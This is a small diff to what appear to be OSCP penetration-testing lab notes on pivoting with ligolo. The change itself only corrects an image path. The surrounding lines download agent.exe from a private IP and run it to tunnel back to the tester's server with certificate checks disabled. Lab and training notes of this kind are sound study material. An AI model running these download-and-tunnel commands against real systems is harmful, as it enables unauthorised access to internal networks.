@@ -9,8 +9,7 @@ wget http://192.168.45.173/agent.exe -outfile agent.exe
 3. Start the ligolo agent to connect to the server 
 ./agent.exe -connect 192.168.45.173:443 -ignore-cert
 
-![Architecture Diagram](/OSCP/images/image.png)
-
+![Architecture Diagram](../../images/image.png)
 
 
 <internal machine>
